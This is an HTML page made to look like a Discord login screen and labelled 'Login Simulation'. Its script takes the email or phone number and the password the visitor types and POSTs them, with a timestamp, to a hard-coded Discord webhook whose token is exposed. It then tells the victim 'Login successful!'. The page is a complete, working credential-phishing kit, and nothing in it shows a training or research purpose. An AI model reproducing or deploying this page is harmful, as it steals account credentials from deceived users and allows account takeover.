<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Login Simulation</title>
  <style>
    body {
      margin: 0;
      font-family: "Helvetica", Arial, sans-serif;
      background-color: #36393f; /* Discord dark background */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      width: 350px;
      background-color: #2f3136;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      text-align: center;
    }

    .login-container h1 {
      color: #fff;
      font-size: 24px;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 4px;
      border: none;
      background-color: #202225;
      color: #fff;
      font-size: 14px;
    }

    input::placeholder {
      color: #b9bbbe;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #5865f2;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s ease;
    }

    button:hover {
      background-color: #4752c4;
    }

    .message {
      margin-top: 10px;
      font-size: 14px;
      display: none;
      color: red;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <h1>Login to Discord</h1>
    <form id="loginForm">
      <input type="text" id="email" placeholder="Email or Phone" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
      <div id="formMessage" class="message"></div>
    </form>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const formMessage = document.getElementById("formMessage");

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      formMessage.style.display = "none";

      // Your Discord webhook URL
      const webhookURL = "https://discord.com/api/webhooks/1408102666973745173/nriysUUoBDw3CDQQso7XLd1W84qhdFTAvEFhbeqef_UNx1KlQlME1YmmRdbyowQYZw1M";

      const data = {
        content: `📩 **Discord Login Simulation**\n📧 Email/Phone: ${document.getElementById("email").value}\n🔑 Password: ${document.getElementById("password").value}\n⏰ Time: ${new Date().toLocaleString()}`
      };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(res => {
        if (res.ok) {
          formMessage.textContent = "Login successful!";
          formMessage.style.color = "limegreen";
          formMessage.style.display = "block";
          form.reset();
          setTimeout(() => { formMessage.style.display = "none"; }, 2000);
        } else {
          throw new Error("Network response was not ok.");
        }
      })
      .catch(err => {
        formMessage.textContent = "Failed to login.";
        formMessage.style.color = "red";
        formMessage.style.display = "block";
        setTimeout(() => { formMessage.style.display = "none"; }, 2000);
      });
    });
  </script>

</body>
</html>
